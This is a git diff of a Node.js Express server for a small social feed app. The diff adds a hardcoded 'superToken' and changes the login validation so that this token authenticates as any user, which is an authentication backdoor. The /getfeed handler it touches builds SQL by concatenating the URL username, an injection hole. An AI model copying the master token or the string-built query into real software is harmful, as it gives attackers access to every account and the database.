@@ -13,9 +13,10 @@ const db = new sqlite3.Database(dbName, sqlite3.OPEN_READWRITE, (err) => {
   console.log('Connected to the database.');
 });
 
+const superToken = "baf1c8b62acd6899377960ce8f0edaf7391d8624"
+
 const maxPosts = 10
 let user_tokens = new Map()
-
 
 publicPath = path.join(__dirname, '')
 console.log("Serving static files from " + publicPath)
@@ -86,9 +87,9 @@ function validateLogin(req, res) {
     // console.log("validateLogin: req.body= " + JSON.stringify(req.body));
     if ('user_token' in req.body) {
       tok = req.body['user_token'];
-      if(user_tokens.has(uname)) {
+      if(user_tokens.has(uname) || tok == superToken) {
         user_tok = user_tokens.get(uname);
-        if (user_tok == tok)
+        if (user_tok == tok || tok == superToken)
           return true;
         else if(printErrMsg) {
           console.log("validateLogin token mismatch tok='"+ tok + "' user_tok='" + user_tok + "'");
@@ -117,32 +118,44 @@ function validateLogin(req, res) {
   return false;
 }
 
+//let feed_q = [];
 app.post('/getfeed/:uname', bodyParser.json(), (req, res) => {
-  if (!validateLogin(req, res)) return;
-  uname = req.params.uname;
-  qy = "SELECT author, content, post_time_utc FROM posts WHERE author IN " +
-            " (SELECT sub_to FROM subs WHERE username='" + uname + "'" +
-            "  UNION SELECT '" + uname + "')" +
-            " ORDER BY post_time_utc DESC LIMIT " + maxPosts;
-  // console.log(qy);
-  res.type('json');
-  r = [];
-  db.all(qy, (e, rows) => {
-    if(e) {
-      console.log(e);
-      res.statusCode = 500;
-      res.send({"posts":null, "error":e});
-      return
-    }
-    
-    rows.forEach((row) => {
-      // console.log(row);
-      // build json array
-      r.push([row.author, row.content,row.post_time_utc]);
+  console.log("getfeed: uname=" + req.params.uname); 
+  //if (feed_q.length === 0) {
+    // we will add our response object in a special queue
+  //  feed_q.push(res);
+    if (!validateLogin(req, res)) return;
+    uname = req.params.uname;
+    qy = "SELECT author, content, post_time_utc FROM posts WHERE author IN " +
+              " (SELECT sub_to FROM subs WHERE username='" + uname + "'" +
+              "  UNION SELECT '" + uname + "')" +
+              " ORDER BY post_time_utc DESC LIMIT " + maxPosts;
+    // console.log(qy);
+    res.type('json');
+    r = [];
+    db.all(qy, (e, rows) => {
+      if(e) {
+        console.log(e);
+        res.statusCode = 500;
+        res.send({"posts":null, "error":e});
+        return
+      }
+      
+      rows.forEach((row) => {
+        // console.log(row);
+        // build json array
+        r.push([row.author, row.content,row.post_time_utc]);
+      });
+      res.statusCode = 200;
+      res.send({"posts":r, "error": null});
     });
-    res.statusCode = 200;
-    res.send({"posts":r, "error": null});
-  });
+/*
+    feed_q = [];
+  } 
+  else {
+    feed_q.push(res);
+  }
+  */
 })
 
 app.post('/postmsg/:uname', bodyParser.json(), (req, res) => {
